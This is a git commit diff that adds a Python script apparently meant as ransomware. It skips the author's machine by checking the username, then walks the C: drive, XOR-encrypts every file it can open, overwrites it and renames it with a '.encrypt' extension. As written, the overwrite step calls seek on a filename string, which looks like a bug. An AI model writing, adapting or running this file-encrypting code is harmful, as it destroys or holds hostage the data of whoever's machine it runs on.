4735b1752a1703d5fe0c80a822016ac6aaaeaaed
极诣·剑魂 <84119280+helloobaby@users.noreply.github.com>
2022-12-20 21:18:52 +0800

    add py script

--- method1_python/main.py
+++ method1_python/main.py
@@ -1,7 +1,39 @@
 import os
 
-os.environ.get('User')
+#print(os.environ.get('USERNAME'))
+if(os.environ.get('USERNAME') == 'asdf'):
+    print('host computer\n')
+    exit(1)
 
-for root, ds, fs in os.walk('USERNAME'):
+def encrypt_buffer(buffer):
+    barr = bytearray(buffer)
+    i=0
+    for c in buffer:
+        c = c ^ 0x7a
+        barr[i]=c
+        i=i+1
+    return barr
+
+for root, ds, fs in os.walk('C:'):
         for f in fs:
-            print(os.path.join(root,f))
+            file_path = os.path.join(root,f)
+            try:
+                fd = open(file_path,'rb+')
+            except:
+                continue
+            try:
+                buffer = fd.read()
+            except:
+                fd.close()
+                continue
+            buffer = bytes(encrypt_buffer(buffer))
+            try:
+                f.seek(0)
+                f.truncate(0)
+                fd.write(buffer)
+            except:
+                fd.close()
+                continue
+            fd.close()
+            os.rename(file_path,file_path+'.encrypt')
+            print(file_path)
